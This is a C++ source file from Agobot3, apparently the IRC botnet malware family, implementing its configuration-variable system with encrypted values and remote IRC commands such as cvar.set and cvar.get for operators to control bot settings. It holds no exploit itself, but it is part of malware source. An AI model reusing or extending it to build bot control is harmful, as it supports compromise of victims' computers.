/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "cvar.h"
#include "mainctrl.h"

CMutex g_mCVarMutex;
	
CCVar::CCVar() { m_lCvars.clear(); }
CCVar::~CCVar() {
	list<cvar*>::iterator ic; for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ic++)
		if((*ic)->bDynamic) delete (*ic); }
bool CCVar::Init() {
	return true; }

void CCVar::RegisterCvar(cvar *pCvar, const CString &sName, const CString &sValue, bool bSave, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sName.Assign(sName);
	pCvar->bSave=bSave;
	g_mCVarMutex.Unlock(); 
	SetCVar(pCvar, sValue); g_mCVarMutex.Lock();
	pCvar->sValue.Assign(sValue);
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; 
	else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) 
		strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	pCvar->bDynamic=false; 
	m_lCvars.push_back(pCvar); 
	g_mCVarMutex.Unlock(); 
}

void CCVar::RegisterCvar(cvar *pCvar, const char *szName, const char *szValue, bool bSave, char *szKey) 
{
	RegisterCvar(pCvar, CString(szName), CString(szValue), bSave, szKey); 
}

cvar *CCVar::TempCvar(const CString &sName, const CString &sValue, char *szKey) {
	cvar *pCvar=new cvar; g_mCVarMutex.Lock(); pCvar->sName.Assign(sName);
	g_mCVarMutex.Unlock(); SetCVar(pCvar, sValue); g_mCVarMutex.Lock();
	pCvar->sValue.Assign(sValue);
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	pCvar->bDynamic=true; m_lCvars.push_back(pCvar); g_mCVarMutex.Unlock();
	return pCvar; }
cvar *CCVar::TempCvar(const char *szName, const char *szValue, char *szKey) {
	return TempCvar(CString(szName), CString(szValue), szKey); }

cvar *CCVar::FindCvarByName(const CString &sName, bool bExact)
{	g_mCVarMutex.Lock();
	list<cvar*>::iterator ic; int iCount=0;
	for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic) {
		CString sListName=(*ic)->sName;
		if(!sListName.CompareNoCase(sName)) {
			g_mCVarMutex.Unlock(); return (*ic);
		}
	}
    g_mCVarMutex.Unlock(); return NULL; }
cvar *CCVar::FindCvarByName(const char *szName, bool bExact)
{	return FindCvarByName(CString(szName), bExact); }

bool CCVar::ParseConfig(const CString &sFilename)
{	return true; }
bool CCVar::ParseConfig(const char *szFilename)
{	return ParseConfig(CString(szFilename)); }

bool CCVar::SaveConfig(const CString &sFilename)
{	return true; }
bool CCVar::SaveConfig(const char *szFilename)
{	return SaveConfig(CString(szFilename)); }

void CCVar::SetCVar(cvar *pCvar, const char *szValue, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Assign(szValue);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, const CString &sValue)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Assign(sValue.m_szString);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true;
	pCvar->sValue.m_bIsCryptStr=sValue.m_bIsCryptStr;
	strncpy(pCvar->sValue.m_szKey, sValue.m_szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, float fValue, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Format("%f", fValue);
	pCvar->fValue=fValue; pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(fValue>=1) pCvar->bValue=true;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, bool bValue, char *szKey)
{	g_mCVarMutex.Lock();
	if(bValue) { pCvar->sValue.Assign("true"); pCvar->fValue=1.0f; pCvar->iValue=1; } 
	else { pCvar->sValue.Assign("false"); pCvar->fValue=0.0f; pCvar->iValue=0; }
	pCvar->bValue=bValue;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, int iValue, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Format("%d", iValue);
	pCvar->fValue=(float)iValue; pCvar->iValue=iValue;
	pCvar->bValue=false; if(iValue>=1) pCvar->bValue=true;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

bool CCVar::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare(m_cmdListCVar.szName)) {
		pMsg->pReply->DoReply(pMsg, "-[ cvar list ]-");
		g_mCVarMutex.Lock();
		list<cvar*>::iterator ic; int iCount=0;
		for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic) {
			iCount++; pMsg->pReply->DoReplyF(pMsg, "%d. / \"%s\" / \"%s\"", iCount, (*ic)->sName.CStr(), (*ic)->sValue.CStr()); }
		g_mCVarMutex.Unlock();
		return true; }

	else if(!pMsg->sCmd.Compare(m_cmdGet.szName)) {
		cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) return pMsg->pReply->DoReplyF(pMsg, "%s == \"%s\"", pTemp->sName.CStr(), pTemp->sValue.CStr());
		else return false; }

	else if(!pMsg->sCmd.Compare(m_cmdSet.szName)) {
		cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) { CString sOldStr(pTemp->sValue); SetCVar(pTemp, pMsg->sChatString.Token(2, " ", true));
			pMsg->pReply->DoReplyF(pMsg, "%s = \"%s\" (was \"%s\")", pTemp->sName.CStr(), pTemp->sValue.CStr(), sOldStr.CStr());
			return true; }
		else return false; }

	else if(!pMsg->sCmd.Compare(m_cmdLoadConfig.szName)) {
		if(ParseConfig(CString("")))
			return pMsg->pReply->DoReplyF(pMsg, "Successfully loaded config...");
		else {
			pMsg->pReply->DoReplyF(pMsg, "Unable to load config...");
			return false; } }

	else if(!pMsg->sCmd.Compare(m_cmdSaveConfig.szName)) {
		if(SaveConfig(CString("")))
			return pMsg->pReply->DoReplyF(pMsg, "Successfully saved config...");
		else {
			pMsg->pReply->DoReplyF(pMsg, "Unable to save config...");
			return false; } }

	return false; }

// Input string example:
// "Bot version %s{bot_id} CVar test... quoted: %q{bot_id} and here a percent sign: %%\n"

CString CCVar::ReplaceVars(const CString &sInput) {
	CString sRetVal("");

	for(int i=0; i<sInput.GetLength(); ++i) {
		if(sInput.operator [](i)=='%' && sInput.operator [](i+1)=='%') {
			char szAddStr[]={sInput.operator [](i), 0};
			sRetVal.Append(szAddStr); ++i; continue; }
			
		if(sInput.operator [](i)=='%') {
			CString sRest=sInput.Mid(i), sVal("");
			char cCmd=sRest.operator [](1);
			CString sCVar=sRest.Token(1, "{").Token(0, "}");
			if(!sCVar.Compare("")) return CString(""); // Dont like that

			cvar *pCVar=FindCvarByName(sCVar.CStr(), false); if(pCVar) {
				switch(cCmd) {
				case 's': sVal.Format("%s", pCVar->sValue.CStr()); break;
				case 'q': sVal.Format("\"%s\"", pCVar->sValue.CStr()); break;
				case 'i': sVal.Format("%i", pCVar->iValue); break;
				case 'b': if(pCVar->bValue) sVal.Format("true"); else sVal.Format("false"); break;
				default: return CString(""); break; } }

			sRetVal.Append(sVal); i+=sCVar.GetLength()+3;
		} else {
			char szAddStr[]={sInput.operator [](i),0};
			sRetVal.Append(szAddStr); continue; }
	}

	return sRetVal; }

REGOBJ(CCVar, g_pCVar, true, 1);
REGCMD(m_cmdListCVar,	"cvar.list",			false,	g_pCVar);
REGCMD(m_cmdGet,		"cvar.get",				false,	g_pCVar);
REGCMD(m_cmdSet,		"cvar.set",				false,	g_pCVar);
REGCMD(m_cmdLoadConfig,	"cvar.loadconfig",		false,	g_pCVar);
REGCMD(m_cmdSaveConfig,	"cvar.saveconfig",			false,	g_pCVar);
